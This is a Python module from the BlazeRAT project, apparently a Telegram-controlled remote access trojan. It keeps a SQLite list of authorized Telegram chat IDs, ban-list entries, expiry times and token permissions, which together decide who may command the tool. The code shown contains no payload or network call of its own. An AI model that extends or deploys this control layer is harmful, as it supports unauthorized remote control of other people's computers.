#!/usr/bin/python3
# -*- coding: utf-8 -*-

# Import modules
from os import path
from time import time
from threading import Lock
from config import auth_expire_time
from sqlite3 import connect as sql_connect
from services.startup import CURRENT_DIRECTORY

"""
Author : LimerBoy
github.com/LimerBoy/BlazeRAT

Notes :
    The file is needed to authorize users
    and check access rights.
"""

# Check if database exists
db_path = path.join(CURRENT_DIRECTORY, "users.db")
assert path.exists(db_path), "Database 'users.db' not found"

# Create connection and cursor
lock = Lock()
connection = sql_connect(
    db_path,
    check_same_thread=False
)
cursor = connection.cursor()

""" Check if user is authorized """
def UserIsAuthorized(chatid: int) -> bool:
    lock.acquire(True)
    sql = "SELECT time, token FROM authorized WHERE chatid=?"
    cursor.execute(sql, (chatid,))
    result = cursor.fetchone()
    lock.release()
    if result is not None:
        return time() - result[0] < auth_expire_time and result[1]
    else:
        return False

""" Authorize user """
def AuthorizeUser(chatid: int, token_name: str) -> str:
    lock.acquire(True)
    # Remove from banlist
    sql = "DELETE FROM banned WHERE chatid=?"
    cursor.execute(sql, (chatid,))
    # Insert token
    sql = "SELECT id FROM authorized WHERE chatid=?"
    cursor.execute(sql, (chatid,))
    # Update time in table
    if cursor.fetchone() is not None:
        sql = "UPDATE authorized SET token=?, time=? WHERE chatid=?"
    else:
        sql = "INSERT INTO authorized (token, time, chatid) VALUES (?, ?, ?)"
    # Execute sql & commit changes
    cursor.execute(sql, (token_name, time(), chatid))
    connection.commit()
    lock.release()
    return sql[:6]

""" Deauthorize user """
def DeauthorizeUser(chatid: int) -> None:
    lock.acquire(True)
    sql = "DELETE FROM authorized WHERE chatid=?"
    cursor.execute(sql, (chatid,))
    connection.commit()
    lock.release()

""" Get token by chat id """
def GetUserToken(chatid: int) -> str:
    sql = "SELECT token FROM authorized WHERE chatid=?"
    cursor.execute(sql, (chatid,))
    return cursor.fetchone()[0]

""" Check if user have permission """
def UserContainsPermission(chatid: int, permission: str) -> bool:
    from core.tokens import TokenContainsPermission
    token_name = GetUserToken(chatid)
    return TokenContainsPermission(token_name, permission)
